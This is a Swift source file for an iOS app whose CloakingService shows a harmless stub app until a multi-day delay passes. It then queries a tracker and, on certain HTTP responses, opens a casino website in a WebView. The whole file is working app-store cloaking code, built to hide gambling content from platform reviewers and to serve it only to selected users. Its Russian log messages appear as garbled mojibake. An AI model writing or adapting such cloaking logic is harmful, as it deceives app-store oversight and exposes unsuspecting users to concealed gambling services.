import Foundation
import Network
@MainActor
class CloakingService: ObservableObject {
    private let userDefaultsManager = UserDefaultsManager.shared
    private let monitor = NWPathMonitor()
    init() {
        setupNetworkMonitor()
    }
    func checkAccess() async -> CloakingResult {
        print("üîç CloakingService: –ù–∞—á–∏–Ω–∞—é –ø—Ä–æ–≤–µ—Ä–∫—É –¥–æ—Å—Ç—É–ø–∞")
        print("üéØ –†–µ–∂–∏–º —Ä–∞–±–æ—Ç—ã: \(CloakingConstants.modeDescription)")
        if CloakingConstants.isInProductionMode {
            ProductionModeSettings.printProductionDiagnostics()
        } else {
            NetworkErrorDebugger.printNetworkDiagnostics()
        }
        #if DEBUG
        if CloakingConstants.forceWebView {
            print("üß™ DEBUG: –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–∞–∑–∏–Ω–æ")
            return .showWebView(url: CloakingConstants.casinoURL)
        }
        if CloakingConstants.forceStubApp {
            print("üß™ DEBUG: –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –±–µ–ª—É—é —á–∞—Å—Ç—å")
            return .showStubApp
        }
        #endif
        let sessionData = userDefaultsManager.getUserSessionData()
        print("üìÖ –î–Ω–µ–π —Å –ø–µ—Ä–≤–æ–≥–æ –∑–∞–ø—É—Å–∫–∞: \(sessionData.daysFromFirstLaunch)")
        print("‚è∞ –ó–∞–¥–µ—Ä–∂–∫–∞ –ø—Ä–æ–π–¥–µ–Ω–∞: \(sessionData.hasDelayPassed)")
        let delayPassed: Bool
        #if DEBUG
        if CloakingConstants.skipDelayCheck {
            delayPassed = true
            print("üß™ –í–†–ï–ú–ï–ù–ù–´–ô –¢–ï–°–¢: –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É 3 –¥–Ω–µ–π - —Å—Ä–∞–∑—É –ø—Ä–æ–≤–µ—Ä—è–µ–º —Ç—Ä–µ–∫–µ—Ä")
        } else if CloakingConstants.mockDelayDays >= 0 {
            delayPassed = CloakingConstants.mockDelayDays >= CloakingConstants.initialDelayDays
            print("üß™ DEBUG: –ú–æ–∫–∞–µ–º –¥–Ω–∏ (\(CloakingConstants.mockDelayDays)), –∑–∞–¥–µ—Ä–∂–∫–∞ –ø—Ä–æ–π–¥–µ–Ω–∞: \(delayPassed)")
        } else {
            delayPassed = sessionData.hasDelayPassed
        }
        #else
        delayPassed = sessionData.hasDelayPassed
        #endif
        guard delayPassed else {
            print("‚ùå –ó–∞–¥–µ—Ä–∂–∫–∞ –Ω–µ –ø—Ä–æ–π–¥–µ–Ω–∞, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –±–µ–ª—É—é —á–∞—Å—Ç—å")
            return .showStubApp
        }
        guard await checkInternetConnection() else {
            print("üåê –ù–µ—Ç –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –±–µ–ª—É—é —á–∞—Å—Ç—å")
            return .showStubApp
        }
        print("üåç –î–µ–ª–∞–µ–º –∑–∞–ø—Ä–æ—Å –∫ —Ç—Ä–µ–∫–µ—Ä—É: \(CloakingConstants.trackerURL)")
        let response = await makeTrackerRequestWithRetry()
        switch response.statusCode {
        case 200, 401:
            print("‚úÖ HTTP \(response.statusCode) - –∏—Å–ø–æ–ª—å–∑—É–µ–º —Ñ–∏–Ω–∞–ª—å–Ω—ã–π URL –∏–∑ —Ç—Ä–µ–∫–µ—Ä–∞")
            let finalURL = response.finalURL ?? CloakingConstants.casinoURL
            print("üéØ –§–∏–Ω–∞–ª—å–Ω—ã–π URL –¥–ª—è WebView: \(finalURL)")
            return .showWebView(url: finalURL)
        case 999:
            print("‚è∞ TIMEOUT: –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ñ–∏–Ω–∞–ª—å–Ω—ã–π URL –∏–∑ —Ç—Ä–µ–∫–µ—Ä–∞ (–º–µ–¥–ª–µ–Ω–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ)")
            let finalURL = response.finalURL ?? CloakingConstants.casinoURL
            print("üéØ –§–∏–Ω–∞–ª—å–Ω—ã–π URL –¥–ª—è WebView: \(finalURL)")
            return .showWebView(url: finalURL)
        case 404, 403:
            print("‚ùå HTTP \(response.statusCode) - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –±–µ–ª—É—é —á–∞—Å—Ç—å")
            return .showStubApp
        case 301, 302, 307, 308:
            print("üîÑ HTTP \(response.statusCode) - —Ä–µ–¥–∏—Ä–µ–∫—Ç, –∏—Å–ø–æ–ª—å–∑—É–µ–º —Ñ–∏–Ω–∞–ª—å–Ω—ã–π URL")
            let finalURL = response.finalURL ?? CloakingConstants.casinoURL
            print("üéØ –§–∏–Ω–∞–ª—å–Ω—ã–π URL –¥–ª—è WebView: \(finalURL)")
            return .showWebView(url: finalURL)
        default:
            print("‚ö†Ô∏è HTTP \(response.statusCode) - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –±–µ–ª—É—é —á–∞—Å—Ç—å –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é")
            return .showStubApp
        }
    }
    private func makeTrackerRequestWithRetry(maxAttempts: Int = 2) async -> TrackerResponse {
        for attempt in 1...maxAttempts {
            print("üîÑ –ü–æ–ø—ã—Ç–∫–∞ \(attempt)/\(maxAttempts)")
            let response = await makeTrackerRequest()
            if response.statusCode != 0 || attempt == maxAttempts {
                return response
            }
            if attempt < maxAttempts {
                print("‚è≥ –ñ–¥–µ–º 2 —Å–µ–∫—É–Ω–¥—ã –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–µ–π –ø–æ–ø—ã—Ç–∫–æ–π...")
                try? await Task.sleep(nanoseconds: 2_000_000_000) 
            }
        }
        return TrackerResponse(statusCode: 0, error: CloakingError.timeoutReached)
    }
    private func makeTrackerRequest() async -> TrackerResponse {
        let startTime = CFAbsoluteTimeGetCurrent()
        do {
            var request = URLRequest(url: URL(string: CloakingConstants.trackerURL)!)
            request.httpMethod = "GET"
            request.timeoutInterval = CloakingConstants.requestTimeoutSeconds
            request.setValue(CloakingConstants.userAgent, forHTTPHeaderField: "User-Agent")
            request.setValue(CloakingConstants.acceptHeader, forHTTPHeaderField: "Accept")
            request.setValue(CloakingConstants.acceptLanguageHeader, forHTTPHeaderField: "Accept-Language")
            request.setValue("keep-alive", forHTTPHeaderField: "Connection")
            request.setValue("1", forHTTPHeaderField: "Upgrade-Insecure-Requests")
            print("üì° ===== –ó–ê–ü–†–û–° –ö –¢–†–ï–ö–ï–†–£ =====")
            print("üåç URL: \(CloakingConstants.trackerURL)")
            print("üìã Method: \(request.httpMethod ?? "GET")")
            print("‚è±Ô∏è Timeout: \(request.timeoutInterval)s")
            print("üìù Headers:")
            if let headers = request.allHTTPHeaderFields {
                for (key, value) in headers {
                    print("   \(key): \(value)")
                }
            }
            print("üöÄ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å...")
            let (data, response) = try await URLSession.shared.data(for: request)
            let responseTime = CFAbsoluteTimeGetCurrent() - startTime
            if let httpResponse = response as? HTTPURLResponse {
                print("üìä ===== –û–¢–í–ï–¢ –û–¢ –¢–†–ï–ö–ï–†–ê =====")
                print("üéØ Status Code: \(httpResponse.statusCode)")
                print("‚ö° Response Time: \(String(format: "%.2f", responseTime))s")
                print("üìç URL: \(httpResponse.url?.absoluteString ?? "N/A")")
                print("üìã Response Headers:")
                for (key, value) in httpResponse.allHeaderFields {
                    print("   \(key): \(value)")
                }
                if !data.isEmpty {
                    if let responseString = String(data: data, encoding: .utf8) {
                        let truncatedResponse = responseString.count > 500 
                            ? String(responseString.prefix(500)) + "..." 
                            : responseString
                        print("üìÑ Response Body (\(data.count) bytes):")
                        print(truncatedResponse)
                    } else {
                        print("üìÑ Response Body: \(data.count) bytes (binary data)")
                    }
                } else {
                    print("üìÑ Response Body: Empty")
                }
                print("üîö ===== –ö–û–ù–ï–¶ –û–¢–í–ï–¢–ê =====")
                switch httpResponse.statusCode {
                case 200:
                    print("‚úÖ HTTP 200: –î–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à–µ–Ω - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –≤–µ–±-–≤—å—é")
                case 401:
                    print("üîê HTTP 401: –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ (Qrator –∑–∞—â–∏—Ç–∞) - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –≤–µ–±-–≤—å—é")
                case 404:
                    print("‚ùå HTTP 404: –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –±–µ–ª—É—é —á–∞—Å—Ç—å")
                case 301, 302, 307, 308:
                    print("üîÑ HTTP \(httpResponse.statusCode): –†–µ–¥–∏—Ä–µ–∫—Ç - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –≤–µ–±-–≤—å—é")
                case 403:
                    print("üö´ HTTP 403: –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –±–µ–ª—É—é —á–∞—Å—Ç—å")
                default:
                    print("‚ö†Ô∏è HTTP \(httpResponse.statusCode): –ù–µ–æ–∂–∏–¥–∞–Ω–Ω—ã–π –∫–æ–¥ - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –±–µ–ª—É—é —á–∞—Å—Ç—å –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é")
                }
                let finalURL = httpResponse.url?.absoluteString
                print("üéØ Final URL: \(finalURL ?? "nil")")
                return TrackerResponse(statusCode: httpResponse.statusCode, finalURL: finalURL)
            } else {
                print("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å HTTP –æ—Ç–≤–µ—Ç")
                print("‚ö° Response Time: \(String(format: "%.2f", responseTime))s")
                return TrackerResponse(statusCode: 0, error: CloakingError.invalidResponse)
            }
        } catch {
            let responseTime = CFAbsoluteTimeGetCurrent() - startTime
            print("‚ùå ===== –û–®–ò–ë–ö–ê –ó–ê–ü–†–û–°–ê =====")
            print("üí• Error: \(error)")
            print("üìù Localized Description: \(error.localizedDescription)")
            print("‚ö° Time: \(String(format: "%.2f", responseTime))s")
            if let urlError = error as? URLError {
                print("üîç URLError Code: \(urlError.code.rawValue)")
                print("üîç URLError Description: \(urlError.localizedDescription)")
                switch urlError.code {
                case .timedOut:
                    print("‚è∞ TIMEOUT: –¢—Ä–µ–∫–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç –º–µ–¥–ª–µ–Ω–Ω–æ, –Ω–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –¥–æ—Å—Ç—É–ø–µ–Ω")
                    #if DEBUG
                    if CloakingConstants.treatTimeoutAsSuccess {
                        print("üß™ DEBUG: treatTimeoutAsSuccess = true")
                        print("üéØ –†–ï–®–ï–ù–ò–ï: –ü–æ–∫–∞–∑—ã–≤–∞–µ–º WebView (—Ç—Ä–µ–∫–µ—Ä —á–∞—Å—Ç–∏—á–Ω–æ —Ä–∞–±–æ—Ç–∞–ª)")
                        print("üîö ===== –ö–û–ù–ï–¶ –û–®–ò–ë–ö–ò =====")
                        let failedURL = (error as NSError).userInfo[NSURLErrorFailingURLStringErrorKey] as? String
                        print("üéØ Failed URL from timeout: \(failedURL ?? "nil")")
                        return TrackerResponse(statusCode: 999, error: error, finalURL: failedURL)
                    } else {
                        print("üß™ DEBUG: treatTimeoutAsSuccess = false") 
                        print("üéØ –†–ï–®–ï–ù–ò–ï: –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥–ª—É—à–∫—É")
                    }
                    #else
                    print("üéØ –†–ï–®–ï–ù–ò–ï: –ü–æ–∫–∞–∑—ã–≤–∞–µ–º WebView (—Ç—Ä–µ–∫–µ—Ä —á–∞—Å—Ç–∏—á–Ω–æ —Ä–∞–±–æ—Ç–∞–ª)")
                    print("üîö ===== –ö–û–ù–ï–¶ –û–®–ò–ë–ö–ò =====")
                    let failedURL = (error as NSError).userInfo[NSURLErrorFailingURLStringErrorKey] as? String
                    print("üéØ Failed URL from timeout: \(failedURL ?? "nil")")
                    return TrackerResponse(statusCode: 999, error: error, finalURL: failedURL)
                    #endif
                case .notConnectedToInternet, .networkConnectionLost:
                    print("üåê –°–ï–¢–¨: –ù–µ—Ç –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è")
                    print("üéØ –†–ï–®–ï–ù–ò–ï: –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥–ª—É—à–∫—É")
                case .cannotFindHost, .cannotConnectToHost:
                    print("üè† HOST: –ù–µ –º–æ–∂–µ–º –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É")
                    print("üéØ –†–ï–®–ï–ù–ò–ï: –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥–ª—É—à–∫—É")
                default:
                    print("‚ùì –î–†–£–ì–ê–Ø –û–®–ò–ë–ö–ê: –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è —Å–µ—Ç–µ–≤–∞—è –ø—Ä–æ–±–ª–µ–º–∞")
                    print("üéØ –†–ï–®–ï–ù–ò–ï: –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥–ª—É—à–∫—É")
                }
            }
            print("üîö ===== –ö–û–ù–ï–¶ –û–®–ò–ë–ö–ò =====")
            return TrackerResponse(statusCode: 0, error: error)
        }
    }
    private func checkInternetConnection() async -> Bool {
        do {
            let url = URL(string: "https://www.google.com")!
            let request = URLRequest(url: url, timeoutInterval: 3.0)
            let (_, response) = try await URLSession.shared.data(for: request)
            if let httpResponse = response as? HTTPURLResponse {
                return httpResponse.statusCode < 400
            }
            return false
        } catch {
            print("üåê Internet check failed: \(error.localizedDescription)")
            return true
        }
    }
    private func setupNetworkMonitor() {
        let queue = DispatchQueue(label: "NetworkMonitor")
        monitor.start(queue: queue)
    }
    deinit {
        monitor.cancel()
    }
}
enum CloakingError: Error, LocalizedError {
    case networkUnavailable
    case invalidResponse
    case timeoutReached
    var errorDescription: String? {
        switch self {
        case .networkUnavailable:
            return "Network unavailable"
        case .invalidResponse:
            return "Invalid server response"
        case .timeoutReached:
            return "Request timeout"
        }
    }
} 